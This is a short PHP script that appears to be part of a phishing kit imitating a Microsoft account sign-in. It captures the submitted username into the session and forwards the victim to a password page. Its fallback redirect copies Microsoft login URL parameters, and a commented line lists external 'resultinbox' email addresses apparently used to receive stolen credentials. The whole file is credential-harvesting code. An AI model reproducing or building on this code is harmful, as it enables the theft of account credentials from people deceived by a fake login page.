<?php

session_start();


if(isset($_REQUEST['signin'])){
//$admin_email = "resultinbox10@zohomail.com,resultinbox10@gmail.com,boxman00712@outlook.com";
$email = $_REQUEST['username'];

if(strlen($email) == 0)    {
    header( "Location: index.php?wa=wsignin1.0&rpsnv=13&ct=1506170093&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=inbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai");
}


else
{

$_SESSION['Email'] = $email;

header('Location: password.php');


}


}
 




?>
